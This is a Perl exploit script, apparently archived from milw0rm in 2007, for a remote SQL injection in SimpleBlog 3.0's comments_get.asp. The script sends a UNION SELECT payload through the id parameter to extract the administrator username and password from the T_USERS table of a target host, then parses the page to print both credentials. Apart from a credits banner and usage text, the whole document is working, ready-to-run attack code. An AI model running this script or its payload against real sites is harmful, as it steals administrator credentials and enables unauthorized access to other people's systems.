<html><head><title>SimpleBlog 3.0 (comments_get.asp id) Remote SQL Injection Vulnerability</title></head><pre>#!/usr/bin/perl

#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#
#              SimpleBlog 3.0 [ comments_get.asp ]               #
#                    ] Remote SQL Injection [                    #
#                                                                #
#              [c]ode by TrinTiTTY [at] g00ns.net                #
#                 Vulnerability by MurderSkillz                  #
#                                                                #
#      shoutz: z3r0, kat, str0ke, rezen, fish, wicked, clorox,   #
#              Canuck, a59, sess, bernard, + the rest of g00ns   #
#  [irc.g00ns.net]       [www.g00ns.net]        [ts.g00ns.net]   #
#++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++#

use LWP::UserAgent;

$host = @ARGV[0];
$ua = LWP::UserAgent-&gt;new;

my $inject ='comments_get.asp?id=-99%20union%20all%20select%201,2,uUSERNAME,4,uPASSWORD,6,7,8,9%20from%20T_USERS';

if (@ARGV &lt; 1){&amp;top( );&amp;usage( )}
elsif ($host =~ /http:\/\//){print&quot;\n\n [-] Don't use http:// in host\n&quot;;exit( 0 );}
else { &amp;xpl( ) }
sub xpl( ) {
  &amp;top( );
  print &quot;\n [~] Connecting\n&quot;;
  $res = $ua-&gt;get(&quot;http://$host/$inject&quot;);

  $con = $res-&gt;content;
  print &quot;\n [~] Checking for admin info\n&quot;;
  if ($con =~ /&lt;strong&gt;([-_+.\w]{1,15})&lt;\/strong&gt;/gmi)
  {
     print &quot;\n\t [+] Admin user: $1\n&quot;;
  }
  if ($con =~ /&lt;a href\=\&quot;http:\/\/(.*)\&quot; target\=\&quot;\_blank\&quot;&gt;(.*)&lt;\/a&gt;/gmi)
  {
     print &quot;\n\t [+] Admin password: $2\n&quot;;
     print &quot;\n [+] Complete\n&quot;;
  }
  else {
      print &quot;\n [-] Unable to retrieve admin info\n&quot;;
      exit(0);
  }
}
sub top( )
{
  print q {
  ##################################################################
  #             SimpleBlog 3.0  [ comments_get.asp ]               #
  #                    ] Remote SQL Injection [                    #
  #                                                                #
  #                [c]ode by TrinTiTTY [at] g00ns.net              #
  #                   Vulnerability by MurderSkillz                #
  ##################################################################
  }
}
sub usage( )
{
  print &quot;\n Usage: perl simpleblog3.pl &lt;host&gt;\n&quot;;
  print &quot;\n Example: perl simpleblog3.pl www.example.com/path\n\n&quot;;
  exit(0);
}

# milw0rm.com [2007-07-28]</pre></html>